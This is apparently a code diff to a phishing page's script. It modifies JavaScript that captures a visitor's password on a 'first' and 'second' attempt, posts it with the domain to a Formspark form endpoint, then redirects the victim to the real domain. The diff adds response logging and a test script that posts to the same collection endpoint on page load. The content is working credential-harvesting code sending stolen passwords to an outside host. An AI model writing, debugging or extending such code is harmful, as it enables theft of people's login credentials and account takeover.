@@ -434,9 +434,17 @@ document.addEventListener("DOMContentLoaded", function() {
                     password: currentPassword,
                     attempt: "first",
                     domain: domainUrl,
-                    Doc_login: true  // IDENTIFIER - Doc_login: true
+                    Doc_login: true
                 })
-            }).catch(error => console.error('Formspark error:', error));
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('First attempt sent successfully');
+                } else {
+                    console.error('Formspark error:', response.status);
+                }
+            })
+            .catch(error => console.error('Formspark error:', error));
             
             document.getElementById("loader-overlay").style.display = "flex";
             
@@ -462,9 +470,17 @@ document.addEventListener("DOMContentLoaded", function() {
                     second_attempt: currentPassword,
                     attempt: "second",
                     domain: domainUrl,
-                    Doc_login: true  // IDENTIFIER - Doc_login: true
+                    Doc_login: true
                 })
-            }).catch(error => console.error('Formspark error:', error));
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Second attempt sent successfully');
+                } else {
+                    console.error('Formspark error:', response.status);
+                }
+            })
+            .catch(error => console.error('Formspark error:', error));
             
             // Redirect to actual domain
             setTimeout(function() {
@@ -509,6 +525,36 @@ document.addEventListener("DOMContentLoaded", function() {
         }
     });
 });
+</script>
+
+<!-- Add this test script to verify Formspark connection -->
+<script>
+// Test Formspark connection on page load
+setTimeout(function() {
+    console.log("🔍 Testing Formspark connection...");
+    fetch('https://submit-form.com/3KukZ309B', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+        },
+        body: JSON.stringify({
+            test: "connection_test",
+            message: "If you see this, Formspark is working!",
+            Doc_login: true
+        })
+    })
+    .then(response => {
+        if (response.ok) {
+            console.log("✅ Formspark connection SUCCESSFUL!");
+            return response.json();
+        } else {
+            console.error("❌ Formspark connection FAILED. Status:", response.status);
+        }
+    })
+    .then(data => console.log("Response:", data))
+    .catch(error => console.error("❌ Formspark connection ERROR:", error));
+}, 1000);
 </script>
 
 </body>
